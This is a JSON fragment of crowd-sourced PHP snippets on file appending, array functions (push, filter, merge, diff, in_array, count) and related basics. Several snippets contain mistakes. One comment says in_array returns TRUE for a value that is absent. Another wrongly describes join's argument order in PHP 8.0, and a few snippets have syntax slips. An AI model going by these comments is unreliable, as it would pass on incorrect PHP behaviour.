    "description": "// LOCK_EX will prevent anyone else writing to the file at the same time // PHP_EOL will add linebreak after each line $txt = \"data-to-add\"; $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  // Second option is this $myfile = fopen(\"logs.txt\", \"a\") or die(\"Unable to open file!\"); $txt = \"user id date\"; fwrite($myfile, \"\\n\". $txt); fclose($myfile);\nfile_put_contents(\"filename.txt\",\"new line to appended\\n\",FILE_APPEND);\n$log_content=\"This line is logged on 2020-08-14 09:55:00\"; $myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\"); fwrite($myfile, $log_content); fclose($myfile);\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3103,
    "keyword": null,
    "link": null,
    "title": " php append string",
    "description": "$string3 = $string1 . $string2;\n<?php $a = \"Hello \"; $b = $a . \"World!\"; // now $b contains \"Hello World!\"  $a = \"Hello \"; $a .= \"World!\";     // now $a contains \"Hello World!\" ?>\n$a = \"hello\"; $b = \"world\"; $c = $a . \" \" . $b;  echo $c; // hello world\necho \"'$animal'\";\n$a = \"Hello \"; $a .= \"World!\";   \n<?php   $example = \"Example text\"   echo (\"Example \" . $example .\" text\") ?>\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3104,
    "keyword": null,
    "link": null,
    "title": " php append to array",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n<?php   $z = ['me','you', 'he'];   array_push($z, 'she', 'it');   print_r($z); ?>\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3105,
    "keyword": null,
    "link": null,
    "title": " php append to csv",
    "description": "$handle = fopen(\"test.csv\", \"a\"); fputcsv($handle, $line); # $line is an array of strings (array|string[]) fclose($handle);\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3106,
    "keyword": null,
    "link": null,
    "title": " php append to file",
    "description": "// LOCK_EX will prevent anyone else writing to the file at the same time // PHP_EOL will add linebreak after each line $txt = \"data-to-add\"; $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  // Second option is this $myfile = fopen(\"logs.txt\", \"a\") or die(\"Unable to open file!\"); $txt = \"user id date\"; fwrite($myfile, \"\\n\". $txt); fclose($myfile);\n$log_content=\"This line is logged on 2020-08-14 09:55:00\"; $myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\"); fwrite($myfile, $log_content); fclose($myfile);\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3107,
    "keyword": null,
    "link": null,
    "title": " php application development that depend on composer",
    "description": "composer install --optimize-autoloader --no-dev\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3108,
    "keyword": null,
    "link": null,
    "title": " php array append",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); print_r($stack); ?> \n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3109,
    "keyword": null,
    "link": null,
    "title": " php array diff",
    "description": " <?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2);  print_r($result); ?>  Array (     [1] => blue )\nInstead of writing out values consider using 'fputcsv()'.  This may solve your problem immediately.  function array2csv($data, $delimiter = ',', $enclosure = '\"', $escape_char = \"\\\\\") {     $f = fopen('php://memory', 'r+');     foreach ($data as $item) {         fputcsv($f, $item, $delimiter, $enclosure, $escape_char);     }     rewind($f);     return stream_get_contents($f); }  $list = array (     array('aaa', 'bbb', 'ccc', 'dddd'),     array('123', '456', '789'),     array('\"aaa\"', '\"bbb\"') ); var_dump(array2csv($list));  /* I hope it will help you. Namaste Stay Home Stay Safe */\n<?php $arr_1 = array(\"a\" => \"car\", \"b\" => \"plane\", \"c\" => \"boat\", \"d\" => \"bike\"); $arr_2 = array(\"e\" => \"car\", \"f\" => \"plane\", \"g\" => \"boat\");  $result = array_diff($arr_1, $arr_2); print_r($result);  /* Result: Array (     [d] => bike )  */ \n<?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2); ?>  Array (     [1] => blue )\nPHP function array_diff(array $array1, array $array2, array ...$_) int[] --------------------------------------------------------------------   Computes the difference of arrays.    Parameters: array--$array1--The array to compare from array--$array2--An array to compare against array--...$_--[optional]    Returns: an array containing all the entries from array1 that are not present in any of the other arrays.\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3110,
    "keyword": null,
    "link": null,
    "title": " php array equality",
    "description": "$arraysAreEqual = ($a == $b); \t// TRUE if $a and $b have the same key/value pairs. $arraysAreEqual = ($a === $b); \t// TRUE if $a and $b have the same key/value pairs  \t\t\t\t\t\t\t\t//\t\tin the same order and of the same types. $arraysAreEqual = (array_diff($a, $b)==[] && array_diff($a, $b) == []);\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3111,
    "keyword": null,
    "link": null,
    "title": " php array extract value",
    "description": " <?php $array = array(\"size\" => \"XL\", \"color\" => \"gold\"); print_r(array_values($array)); ?>  \n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3112,
    "keyword": null,
    "link": null,
    "title": " php array fill",
    "description": "<?php $arr_fill = array_fill(5, 5, \"PHP\");  echo \"<pre>\"; print_r($arr_fill); echo \"</pre>\"; ?>\narray_fill ( int $start_index , int $num , mixed $value ) : array\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3113,
    "keyword": null,
    "link": null,
    "title": " php array filter",
    "description": "$my_array = ['foo' => 1, 'hello' => 'world']; $allowed  = ['foo', 'bar']; $filtered = array_filter(     $my_array,     function ($key) use ($allowed) {         return in_array($key, $allowed);     },     ARRAY_FILTER_USE_KEY );\n$numbers = [2, 4, 6, 8, 10];  function MyFunction($number) {   return $number > 5; }  $filteredArray = array_filter($numbers, \"MyFunction\");  /**  * `$filteredArray` now contains: `[6, 8, 10]`  * NB: Use this to remove what you don't want in the array  * @see `array_map` when you want to alter/change elements  * in the array.  */\n <?php  $arr = ['a' => 1, 'b' => 2, 'c' => 3, 'd' => 4];  var_dump(array_filter($arr, function($k) {     return $k == 'b'; }, ARRAY_FILTER_USE_KEY));  var_dump(array_filter($arr, function($v, $k) {     return $k == 'b' || $v == 4; }, ARRAY_FILTER_USE_BOTH)); ?>  \n$array = [1, 2, 3, 4, 5];  $filtered = array_filter($array, function($item) {     return $item != 4; // Return (include) current item if expression is truthy });  // $filtered = [1, 2, 3, 5]\nOdd : Array (     [a] => 1     [c] => 3     [e] => 5 ) Even: Array (     [0] => 6     [2] => 9     [4] => 10     [6] => 12 ) \n?php $data= [     0 => [1, 'test1'],     1 => [2, 'test2'],     2 => [3, 'test3'], ];  $ids = array_map(function($item) {     return $item[0]; }, $data);  var_dump($ids);\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3114,
    "keyword": null,
    "link": null,
    "title": " php array filter syntax",
    "description": "$numbers = [2, 4, 6, 8, 10];  function MyFunction($number) {   return $number > 5; }  $filteredArray = array_filter($numbers, \"MyFunction\");  /**  * `$filteredArray` now contains: `[6, 8, 10]`  * NB: Use this to remove what you don't want in the array  * @see `array_map` when you want to alter/change elements  * in the array.  */\n$var = [   'first' => 'one',   'second' => null,   'third' => 'three', ];   $filteredArray = array_filter($var); // output: ['first'=>'one,'third'=>'three']\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3115,
    "keyword": null,
    "link": null,
    "title": " php array formatted output",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\");\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3116,
    "keyword": null,
    "link": null,
    "title": " php array get first x elements",
    "description": "$sliced_array = array_slice($array, 0, 5) \narray_values($array)[0]; \n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3117,
    "keyword": null,
    "link": null,
    "title": " php array get value at index",
    "description": "$array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1;\n$array = array('foo' => 'bar', 33 => 'bin', 'lorem' => 'ipsum'); $array = array_values($array); echo $array[0]; //bar echo $array[1]; //bin echo $array[2]; //ipsum\n",
    "reg_date": "2021-10-12T10:17:26.000Z"
  },
  {
    "id": 3118,
    "keyword": null,
    "link": null,
    "title": " php array has value",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n<?php $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Existe Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Existe mac\"; } ?>\nif (!empty($data_days) && in_array(1, $data_days, true)){ // use numeric value 1, not string\nin_array ( mixed $needle , array $haystack , bool $strict = false ) : bool\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3119,
    "keyword": null,
    "link": null,
    "title": " php array if",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n$os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; }\n$allowedFileType = ['application/vnd.ms-excel','text/xls','text/xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'];    if(in_array($_FILES[\"file\"][\"type\"],$allowedFileType))\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3120,
    "keyword": null,
    "link": null,
    "title": " php array in cookie",
    "description": "// Storing code setcookie('your_cookie_name', json_encode($info), time()+3600);  // Reading code  $data = json_decode($_COOKIE['your_cookie_name'], true);\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3121,
    "keyword": null,
    "link": null,
    "title": " php array index exists",
    "description": "// Here's our fruity array $fruits = ['apple', 'pear', 'banana'];  // Use it in an `if` statement if (array_key_exists(\"banana\", $fruits)) {  // Do stuff because `banana` exists }  // Store it for later use $exists = array_key_exists(\"peach\", $fruits);  // Return it directly return array_key_exists(\"pineapple\", $fruits);\n<?php $array1=array(\"Orange\" => 100, \"Apple\" => 200, \"Banana\" => 300, \"Cherry\" => 400); if (array_key_exists(\"Banana\",$array1)) { echo \"Array Key exists...\"; } else { echo \"Array Key does not exist...\"; } ?> \n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3122,
    "keyword": null,
    "link": null,
    "title": " php array is assoc",
    "description": "function isAssoc(array $arr) {     if (array() === $arr) return false;     return array_keys($arr) !== range(0, count($arr) - 1); }  var_dump(isAssoc(['a', 'b', 'c'])); // false var_dump(isAssoc([\"0\" => 'a', \"1\" => 'b', \"2\" => 'c'])); // false var_dump(isAssoc([\"1\" => 'a', \"0\" => 'b', \"2\" => 'c'])); // true var_dump(isAssoc([\"a\" => 'a', \"b\" => 'b', \"c\" => 'c'])); // true \n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3123,
    "keyword": null,
    "link": null,
    "title": " php array is associative",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\nfunction isAssoc(array $arr) {     if (array() === $arr) return false;     return array_keys($arr) !== range(0, count($arr) - 1); }  var_dump(isAssoc(['a', 'b', 'c'])); // false var_dump(isAssoc([\"0\" => 'a', \"1\" => 'b', \"2\" => 'c'])); // false var_dump(isAssoc([\"1\" => 'a', \"0\" => 'b', \"2\" => 'c'])); // true var_dump(isAssoc([\"a\" => 'a', \"b\" => 'b', \"c\" => 'c'])); // true \n<?php    /*   there are three type of array   \t1 - Indexed array   */  \t$a = array('a','b','c'); \t$b = ['a','b','c']; \t/*     2 - Associative array     */ \t$c = array(     \t'keyOne'=>'valueOne',       \t'keyTwo'=>'valueTwo'     ); \t$d = [       'keyOne'=>'valueOne',       'keyTwo'=>'valueTwo'     ]; /*     3 - Multidimensional  array     */ \t$c = array(     \t'keyOne'=>array('a','b','c'),       \t'keyTwo'=>array('a'=>'1','b'=>'2')     ); \t$d = [       'keyOne'=>['a','b','c'],       \t'keyTwo'=>['a'=>'1','b'=>'2']     ];   ?>\n<?php $arr = array('fruit' => 'mango', 'vegetable' => 'tomato', 'thing' => 'bag'); echo $arr['fruit']; /*OUTPUT mango*/ ?>\n// Associative Array in PHP  /******** ARRAY TYPES  ************************************************ There are basically 03 Types of array in php   1. Indexed arrays          => Arrays with a numeric index 2. Associative arrays      => Arrays with named keys 3. Multidimensional arrays => Arrays containing one or more arrays ***********************************************************************/  //EXAMPLE //This is the second one - Associative arrays  $age = array(\"Peter\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Peter'] . \" years old.\";\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3124,
    "keyword": null,
    "link": null,
    "title": " php array join",
    "description": "$arr = array('Hello','World!','Beautiful','Day!'); echo join(\", \",$arr);\n$arr = array('Hello','World!','Beautiful','Day!'); echo join(\",\",$arr);\nDefinition and Usage The join() function returns a string from the elements of an array.  The join() function is an alias of the implode() function.  Note: The join() function accept its parameters in either order. However, for consistency with explode(), you should use the documented order of arguments.  Note: The separator parameter of join() is optional. However, it is recommended to always use two parameters for backwards compatibility.  Syntax join(separator,array)    Example Join array elements with a string:  <?php $arr = array('Hello','World!','Beautiful','Day!'); echo join(\" \",$arr); ?>    Output: Hello World! Beautiful Day!\n<?php $arr = array('Hello','World!','Beautiful','Day!'); echo join(\" \",$arr); ?>\n// from PHP 8.0 (order parameters has been changed) $arr = array('Hello','World!','Beautiful','Day!'); echo join($arr, \", \");\n $array1 = [1, 5, 64, 2, 6]; $array2 = [2, 1, 8, 3];  //Method 1: array_filter($array1, function($_){     global $array2;   return in_array($_, $array2); }); // Output: [0 => 1, 3 => 2]  //Method 2: array_intersect($array1, $array2); //Output: [0 => 1, 3 => 2] \n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3125,
    "keyword": null,
    "link": null,
    "title": " php array lenght",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\necho count($my_array); echo sizeof($my_array);    // alias\n<?php   //use count($var) -> $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3126,
    "keyword": null,
    "link": null,
    "title": " php array length",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\nvar arr = [10,20,30,40,50]; //An Array is defined with 5 instances  var len= arr.length;  //Now arr.length returns 5.Basically, len=5. console.log(len); //gives 5 console.log(arr.length); //also gives 5\n<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\n<?php    $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\");   echo count($names);  $cars=array(\"Volvo\",\"BMW\",\"Toyota\");  echo count($cars); // test\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3127,
    "keyword": null,
    "link": null,
    "title": " php array loop",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\nfor ($i = 0; $i < count($array); $i++) {     echo $array[$i]['filename'];     echo $array[$i]['filepath']; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\nforeach($array as $i => $item) {     echo $item[$i]['filename'];     echo $item[$i]['filepath'];      // $array[$i] is same as $item }\n$letters = ['a','b','c']; foreach ($letters as $item) {   echo $item; }\nforeach($array as $item) {     echo $item['filename'];     echo $item['filepath'];      // to know what's in $item     echo '<pre>'; var_dump($item); }\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3128,
    "keyword": null,
    "link": null,
    "title": " php array map cast to int",
    "description": "$integerIDs = array_map('intval', explode(',', $string));\n",
    "reg_date": "2021-10-12T10:17:27.000Z"
  },
  {
    "id": 3129,
    "keyword": null,
    "link": null,
    "title": " php array map passing parameters",
    "description": "function myarraymap($item,$item2) {     return $item[$item2]; }  $param = 'some_value';  $ids = array_map(     function($item) use ($param) { return myarraymap($item, $param); },     $data['student_teacher'] ); \narray_map with param and user function php\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3130,
    "keyword": null,
    "link": null,
    "title": " php array merge",
    "description": " <?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); ?> Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) \n<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\n<?php  $array1 = array('key1' => 'test1', 'key2' => 'test2'); $array2 = array('key3' => 'test3', 'key4' => 'test4');  $resultArray = array_merge($array1, $array2);  // If you have numeric or numeric like keys, array_merge will  // reset the keys to 0 and start numbering from there  $resultArray = $array1 + $array2;  // Using the addition operator will allow you to preserve your keys, // however any duplicate keys will be ignored.\n$output = array_merge($array1, $array2);\n/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \narray_merge ([ array $... ] ) : array\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3131,
    "keyword": null,
    "link": null,
    "title": " php array merge for associative arrays",
    "description": "<?php  $array1 = array('key1' => 'test1', 'key2' => 'test2'); $array2 = array('key3' => 'test3', 'key4' => 'test4');  $resultArray = array_merge($array1, $array2);  // If you have numeric or numeric like keys, array_merge will  // reset the keys to 0 and start numbering from there  $resultArray = $array1 + $array2;  // Using the addition operator will allow you to preserve your keys, // however any duplicate keys will be ignored.\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3132,
    "keyword": null,
    "link": null,
    "title": " php array merge skip diplicate",
    "description": "You can use the PHP array_unique() function and PHP array_merge() function together to merge two arrays into one array without duplicate values in PHP.\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3133,
    "keyword": null,
    "link": null,
    "title": " php array move first element to last",
    "description": "$array = array(\"PHP\", \"JS\", \"JAVA\"); $first_element = array_shift($array); $array[count($array) + 1] = $first_element; print_r($array);\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3134,
    "keyword": null,
    "link": null,
    "title": " php array of all countries",
    "description": "$country_list = array( \t\t\"Afghanistan\", \t\t\"Albania\", \t\t\"Algeria\", \t\t\"Andorra\", \t\t\"Angola\", \t\t\"Antigua and Barbuda\", \t\t\"Argentina\", \t\t\"Armenia\", \t\t\"Australia\", \t\t\"Austria\", \t\t\"Azerbaijan\", \t\t\"Bahamas\", \t\t\"Bahrain\", \t\t\"Bangladesh\", \t\t\"Barbados\", \t\t\"Belarus\", \t\t\"Belgium\", \t\t\"Belize\", \t\t\"Benin\", \t\t\"Bhutan\", \t\t\"Bolivia\", \t\t\"Bosnia and Herzegovina\", \t\t\"Botswana\", \t\t\"Brazil\", \t\t\"Brunei\", \t\t\"Bulgaria\", \t\t\"Burkina Faso\", \t\t\"Burundi\", \t\t\"Cambodia\", \t\t\"Cameroon\", \t\t\"Canada\", \t\t\"Cape Verde\", \t\t\"Central African Republic\", \t\t\"Chad\", \t\t\"Chile\", \t\t\"China\", \t\t\"Colombi\", \t\t\"Comoros\", \t\t\"Congo (Brazzaville)\", \t\t\"Congo\", \t\t\"Costa Rica\", \t\t\"Cote d'Ivoire\", \t\t\"Croatia\", \t\t\"Cuba\", \t\t\"Cyprus\", \t\t\"Czech Republic\", \t\t\"Denmark\", \t\t\"Djibouti\", \t\t\"Dominica\", \t\t\"Dominican Republic\", \t\t\"East Timor (Timor Timur)\", \t\t\"Ecuador\", \t\t\"Egypt\", \t\t\"El Salvador\", \t\t\"Equatorial Guinea\", \t\t\"Eritrea\", \t\t\"Estonia\", \t\t\"Ethiopia\", \t\t\"Fiji\", \t\t\"Finland\", \t\t\"France\", \t\t\"Gabon\", \t\t\"Gambia, The\", \t\t\"Georgia\", \t\t\"Germany\", \t\t\"Ghana\", \t\t\"Greece\", \t\t\"Grenada\", \t\t\"Guatemala\", \t\t\"Guinea\", \t\t\"Guinea-Bissau\", \t\t\"Guyana\", \t\t\"Haiti\", \t\t\"Honduras\", \t\t\"Hungary\", \t\t\"Iceland\", \t\t\"India\", \t\t\"Indonesia\", \t\t\"Iran\", \t\t\"Iraq\", \t\t\"Ireland\", \t\t\"Israel\", \t\t\"Italy\", \t\t\"Jamaica\", \t\t\"Japan\", \t\t\"Jordan\", \t\t\"Kazakhstan\", \t\t\"Kenya\", \t\t\"Kiribati\", \t\t\"Korea, North\", \t\t\"Korea, South\", \t\t\"Kuwait\", \t\t\"Kyrgyzstan\", \t\t\"Laos\", \t\t\"Latvia\", \t\t\"Lebanon\", \t\t\"Lesotho\", \t\t\"Liberia\", \t\t\"Libya\", \t\t\"Liechtenstein\", \t\t\"Lithuania\", \t\t\"Luxembourg\", \t\t\"Macedonia\", \t\t\"Madagascar\", \t\t\"Malawi\", \t\t\"Malaysia\", \t\t\"Maldives\", \t\t\"Mali\", \t\t\"Malta\", \t\t\"Marshall Islands\", \t\t\"Mauritania\", \t\t\"Mauritius\", \t\t\"Mexico\", \t\t\"Micronesia\", \t\t\"Moldova\", \t\t\"Monaco\", \t\t\"Mongolia\", \t\t\"Morocco\", \t\t\"Mozambique\", \t\t\"Myanmar\", \t\t\"Namibia\", \t\t\"Nauru\", \t\t\"Nepal\", \t\t\"Netherlands\", \t\t\"New Zealand\", \t\t\"Nicaragua\", \t\t\"Niger\", \t\t\"Nigeria\", \t\t\"Norway\", \t\t\"Oman\", \t\t\"Pakistan\", \t\t\"Palau\", \t\t\"Panama\", \t\t\"Papua New Guinea\", \t\t\"Paraguay\", \t\t\"Peru\", \t\t\"Philippines\", \t\t\"Poland\", \t\t\"Portugal\", \t\t\"Qatar\", \t\t\"Romania\", \t\t\"Russia\", \t\t\"Rwanda\", \t\t\"Saint Kitts and Nevis\", \t\t\"Saint Lucia\", \t\t\"Saint Vincent\", \t\t\"Samoa\", \t\t\"San Marino\", \t\t\"Sao Tome and Principe\", \t\t\"Saudi Arabia\", \t\t\"Senegal\", \t\t\"Serbia and Montenegro\", \t\t\"Seychelles\", \t\t\"Sierra Leone\", \t\t\"Singapore\", \t\t\"Slovakia\", \t\t\"Slovenia\", \t\t\"Solomon Islands\", \t\t\"Somalia\", \t\t\"South Africa\", \t\t\"Spain\", \t\t\"Sri Lanka\", \t\t\"Sudan\", \t\t\"Suriname\", \t\t\"Swaziland\", \t\t\"Sweden\", \t\t\"Switzerland\", \t\t\"Syria\", \t\t\"Taiwan\", \t\t\"Tajikistan\", \t\t\"Tanzania\", \t\t\"Thailand\", \t\t\"Togo\", \t\t\"Tonga\", \t\t\"Trinidad and Tobago\", \t\t\"Tunisia\", \t\t\"Turkey\", \t\t\"Turkmenistan\", \t\t\"Tuvalu\", \t\t\"Uganda\", \t\t\"Ukraine\", \t\t\"United Arab Emirates\", \t\t\"United Kingdom\", \t\t\"United States\", \t\t\"Uruguay\", \t\t\"Uzbekistan\", \t\t\"Vanuatu\", \t\t\"Vatican City\", \t\t\"Venezuela\", \t\t\"Vietnam\", \t\t\"Yemen\", \t\t\"Zambia\", \t\t\"Zimbabwe\" \t);\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3135,
    "keyword": null,
    "link": null,
    "title": " php array order by date",
    "description": "usort($array, function($a, $b) {   return new DateTime($a['datetime']) <=> new DateTime($b['datetime']); });\n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3136,
    "keyword": null,
    "link": null,
    "title": " php array pop reverse",
    "description": " <?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //$fruit = \"orange\";  ?>  \n",
    "reg_date": "2021-10-12T10:17:28.000Z"
  },
  {
    "id": 3137,
    "keyword": null,
    "link": null,
    "title": " php array push",
